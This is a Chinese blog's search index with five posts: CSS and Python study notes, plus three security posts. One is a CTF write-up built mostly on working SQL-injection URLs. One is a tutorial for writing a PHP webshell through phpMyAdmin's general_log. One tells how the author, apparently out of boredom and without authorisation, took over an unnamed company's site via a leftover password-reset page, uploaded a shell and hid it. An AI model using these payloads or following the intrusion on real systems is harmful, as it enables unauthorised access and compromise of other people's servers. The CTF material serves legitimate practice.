    <content type="text"><![CDATA[前些天 国光老哥在群里问有没有打NJUPT CTF的 校外和他组队 然后问了问光光老哥说是 面向校外 不能太简单 但是对新手也不会太不友好 然后就本着去学东西 练习的态度 抱老哥的大腿去（嘻嘻）最后果然 校外队第九 咳咳 虽然我只是观众 大佬们都很强哟 但是也不希望自己一直都是观众 所以 特此总结一些题 希望以后越来越🐮🍺 签到题 满怀自信的右键源代码 然后发现并没有flag 最后大佬们发现直接访问主域名 老把精力放在了secret.php 这上面 滴！晨跑打卡这道题 是自己复习的重点了 点进去 知道考察的是 mysql 注入 但是 当时自己就是搞不出来 还差的远 事后又请教了国光老哥 验证注入是否存在验证时候发现过滤了空格 用%a0即可绕过 1&apos;%a0||&apos;1 这里直接查询出所有的数据了 如果没有这个语句的话 默认只查询出1条数据 ‘ or ‘1 相当于构造出一个用真的条件 开始进行注入 ​ 咳咳 大佬语录记录一下 ！借助hackbar可以进行快速的注入 判断注入的字段数123&apos;%a0union%a0select%a01,2,3||&apos;1 &apos; union select 1,2,3 ||&apos;1闭合前面的引号 核心语句 查报错的字段数 构造用真条件 闭合后面语句 所有数据库1http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0UNION%a0SELECT%a0(SELECT%a0GROUP_CONCAT(schema_name%a0SEPARATOR%a00x3c62723e)%a0FROM%a0INFORMATION_SCHEMA.SCHEMATA),2,3||%271 咳咳根据我多年打酱油的经验 查询flaaaaaaag数据库下面的表1http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0UNION%a0SELECT%a0(SELECT%a0GROUP_CONCAT(table_name%a0SEPARATOR%a00x3c62723e)%a0FROM%a0INFORMATION_SCHEMA.TABLES%a0WHERE%a0TABLE_SCHEMA=0x666c6161616161616167),2,3||%271 f144444444g 查询列名1http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0UNION%a0SELECT%a0(SELECT%a0GROUP_CONCAT(column_name%a0SEPARATOR%a00x3c62723e)%a0FROM%a0INFORMATION_SCHEMA.COLUMNS%a0WHERE%a0TABLE_NAME=0x6631343434343434343467),2,3||%271 查出数据1http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0UNION%a0SELECT%a0(SELECT%a0GROUP_CONCAT(column_name%a0SEPARATOR%a00x3c62723e)%a0FROM%a0INFORMATION_SCHEMA.COLUMNS%a0WHERE%a0TABLE_NAME=0x6631343434343434343467),2,3||%271 nctf{this_1s_paocao_sqllllll}]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css样式那些事]]></title>
    <url>%2F2018%2F11%2F05%2Fcss%E6%A0%B7%E5%BC%8F%E9%82%A3%E4%BA%9B%E4%BA%8B%2F</url>
    <content type="text"><![CDATA[最近学校开了前端 希望通过自己的努力打开web前端的大门 最令人头疼的就是css的各种属性 真心事记住不 所以 写篇文章总结一下 文字样式常用单位首先看一下css样式的常用单位 以 px像素为单位的 em 对于文本类型的属性经常使用到 1em指一个字符 2em指两个字符(比如我们设置行高 两个字符的行高 就把这个属性的值设置成2em) 还有一个%为单位 这个不用多说了把 文本样式12color 文本的颜色 (red #f00 rgd(255,0,0) ) letter-spacing 字符间距 (2px -3px) 1line-height 行高 (14px 1.5em 120%) 很多时候我们用这个来做垂直居中 1line-height =height 的时候 就会做到垂直居中 1text-align 对齐 (center居中 left左 right右 justify两端对齐不会让两端出现空白的部分） 1text-decoration 装饰线 (none无装饰线 默认情况下超链接下面都带有竖线 貌似很影响美观把 这时候none可将其取消，overline装饰线在文本的上方 underline装饰线在文本的下方 line-through 装饰线作为删除线贯穿文本之中) 1text-indent 首行缩进 (2em) 字体font 老规矩还是一张图 节省时间学习新知识去 O(∩_∩)O 背景超链接样式背景类型的样式我们用background 123background-color: 背景颜色background-image:url(&quot;logo,jpg&quot;) 背景图片 注意如果同时设置背景颜色和背景图片的话 背景图片会覆盖掉背景颜色 1234567background-repeat: repeat 背景图片的填充方式 repeat-x repeat-y no-repeat ​ 可能显得太麻烦 太多 太难记 其实也可以用 1background: 颜色 图片 repeat 来统一设置 连接的四种形态超链接的样式是用a开头 1234a:link --普通的未被访问的链接a:visited -用户已访问的链接a:hover -鼠标指针位于链接的上方悬停a:active - 链接被点击的时刻 这种超链接或这种选择器的类型称为伪类选择器 这种位置分先后顺序的 l v h a 四种状态下设置超链接样式时候的设置方式和设置顺序 a:hover也能做出简单的动画效果 根据前面的学习不难看出 ，鼠标顶留在a标签文字上 字体放大 120% 这种简单的动画效果貌似还很常用的吧😁 列表 表格样式列表的样式吧 主要是list开头 列表的样式这里指无序列表(ul)和有序列表(ol) 共用样式有一下几种 1234567list-style 所有列表属性设置在这个声明中list-style-image 为列表项设置图像list-style-position 标志的位置list-style-type 标志的类型 list-style-type 属性type属性对于有序和无序列表可以取得以下这些值 前四种针对无序列表 后面针对有序列表 list-style-position123list-style-position:insidelist-style-position:outside 两者区别在哪 用文字说可能比较抽象 我们用一张图表示更加明确 inside 标号是向右缩进到这个列表区域之内 outside 是在列表的左侧 list-style-imageimage属性可以规定列表的标号是一个图片：list-style-image:url(“1.jpg”); 可以起到美化页面的作用 表格样式表格样式主要是设置表格的高和宽 这个大家应该都知道 还有一个经常是用的就是border 边框属性 还有一个非常重要的border-collapse属性 合并默认表格样式 123456table&#123; width:100px; height:100px; border:1px solid #eee ; //一个像素宽 实线显示 灰色 每个属性之间用空格隔开 border-collapse:collapse;&#125;]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python学习笔记]]></title>
    <url>%2F2018%2F10%2F29%2FPython%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[入坑了python3 知识点颇多 看了一遍 看第二遍时候发现 和没看没什么两样 所以把某些知识点 记录一下 加深印象也方便 忘记时候查看 组和数据类型集合类型及操作集合元素之间无序，每个元素唯一 不存在相同元素 ，集合元素是不可变数据类型，在Python中集合用{}表示，元素间用 “,”分隔 也可以用set()建立集合 set()将每个字符单独拆分 变成集合的元素 集合操作符 可能有点难理解 那我们就打一下 a = {&quot;p&quot;,&quot;y&quot;,123}b = set(&quot;pypy123&quot;)a-b{123}b-a{&#39;2&#39;, &#39;3&#39;, &#39;1&#39;}a&amp;b{&#39;y&#39;, &#39;p&#39;}a|b{&#39;3&#39;, &#39;1&#39;, &#39;2&#39;, &#39;y&#39;, 123, &#39;p&#39;} 在四种基本操作符上python提供了增强操作符 通过四种操作符于赋值符号 来完成对集合s的更新 集合处理方法s.add(x) 将x增加到集合s s.discard(x) 从集合s中移除x 如果x不再集合s中，不报错 s.remove(x) 从集合s中移除x 如果x不再集合s中，报出KeyError s.clear()移除s中所有元素 s.pop() 随机返回一个s元素 s为空则 报出KeyError s.copy 返回集合s的一个副本 len(s) 返回集合s的元素个数 x in s 判断x是否在s中 是则True 否则False set(x)将其他类型变量转换为集合 集合类型总结集合类型 适用于包含关系的比较 举个例子 还有一个非常重要的 数据去重 就是利用 集合类型不能重复的特点 例如将一个List 去掉其中的重复元素 这里就可以用集合进行数据去重 非常简单容易 这里先用set 将list转换成集合来达到了 去重的目的 然后将集合在转换为列表。 序列类型及操作序列类型包括 字符串类型 元组类型和列表类型 序列操作符x in s 如果x是序列s的元素则返回True 否则返回Fals s+t 链接两个序列 s+t s * n或n * s 将序列s复制n次 s[i] 索引返回s中的第i个元素 s[i:j:k] 切片返回序列s中 i到j 且步长为k的元素序列 序列函数和方法len(s) 返回序列s的长度 min(s) 返回序列s的最小元素 max(s) 返回序列s的最大元素 s.count(x) 返回序列s中出现x的次数 元组类型及操作元组是序列类型的一种,使用() 或tuple()创建 元素间用,分隔。元组创建以后不能修改 元组继承了序列全部通用操作 列表类型及操作列表是序列类型的一种,使用[] 或list()创建 元素间用,分隔。列表创建可以随意修改 列表类型操作函数和方法到这里内容很多 一会还要去上课 (其实是懒得打了)就从网上找了两张图 很详细 序列类型总结序列类型 包括字符串 列表 元组 元组操作于序列基本相似，列表的话再序列基础上增加很多 更加灵活 字典类型及操作字典类型的定义映射是一种键(索引)和值(数据)的对应 ​ “城市”:”北京” ​ “姓名”:”周某人” 字典是键值对的集合，键值对之间无序 键值对：键是数据索引的扩展 采用{}和dict()创建键值对用·冒号:表示 在字典变量中通过建获得值 a[“中国”] 则会出现北京 字典类型操作函数和方法 字典类型的应用场景统计数据出现的次数，数据是键 次数是值 主要作用：表达键值对数据 进而操作 字典类型总结映射关系采用键值对表示 字典类型采用{}和dict()创建 键值对之间用:隔开 d[key] 既可以索引也可以赋值 牢记字典类型的操作函数]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php myadmin写shell]]></title>
    <url>%2F2018%2F08%2F26%2Fphp%20myadmin%D0%B4shell%2F</url>
    <content type="text"><![CDATA[有时候在渗透测试过程中 我们会得到php myadmin 的账号和密码 既然登陆了php myadmin 就可以用php myadmin 来get shell。 具体内容 简单说明登陆进php myadmin 有些朋友可能会直接选择去写入一个webshell 执行后会弹出大概无法写入的意思 这里和php myadmin的设置有关系 在实战情况下一般都不能直接去写入一个shell的。 这时候我们需要换个思路 利用mysql 错误日志写入一句话这里需要先设置 general log (日志保存状态)general log file(日志保存路径) 先执行 1show variables like &apos;general%&apos; a 我们需要把general log 改为ON 也就是打开状态 还要把general log file路径改为网站的根目录 123set global general_log = &quot;ON&quot;; set global general_log_file=&apos;D:/stduy/PHPTutorial/WWW/infos.php&apos;; 执行完后因为我是本地搭建环境所以可以看到成功创建了 现在我们只需要输入一个错误的sql语句即可 这里我写入一句话 可以看到一句话已经存在于infos.php里面了 之后我们菜刀直接链接即可 总结网上有许多相关的文章 不过自己写一遍印象才会更深刻吧]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>php myadmin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透某企业]]></title>
    <url>%2F2018%2F08%2F09%2F%E6%B8%97%E9%80%8F%E6%9F%90%E4%BC%81%E4%B8%9A%2F</url>
    <content type="text"><![CDATA[在家无聊，突然想到博客搞上也有数天 没时间写文章，今天正好无聊 实战内容确定目标站 信息收集相信很多人吧都会忽略信息收集这一块，完整的信息收集应该包括 收集 whois 邮箱 收集 子域名 c段 旁站 收集网站架构 运行的服务 对应的端口 探测 waf google hacking 敏感文件 收集网站的 cms 信息 有所发现在信息收集的过程中我发现网站右上脚有 因为主站是伪静态 我本人确实很排斥这种伪静态 我就点了英文版的站 就发现 主站的url:www.xxx.com 英文版url:www.xxx.com/en 原来是分目录 English的站并没有做伪静态 准备对准他下手 习惯性的先扫描一番 我发现了此文件 ,打开一看我尼玛 管理员真的粗心,是一个密码重置，管理员居然没有删 因为我知道有admin 所以第一步直接填了admin 第二步即可重置，改完密码直接进入后台 拿shelldede cms拿shell很简单 有个文件管理器直接可上传get shell 拿到shell后可直接跨目录 因为信息收集我发现是apache 还有.htacces文件 可以更好的隐藏我们的shell 这里我就不演示了 此篇没有什么技术含量 只当是做个笔记而已]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>实战</tag>
      </tags>
  </entry>
</search>
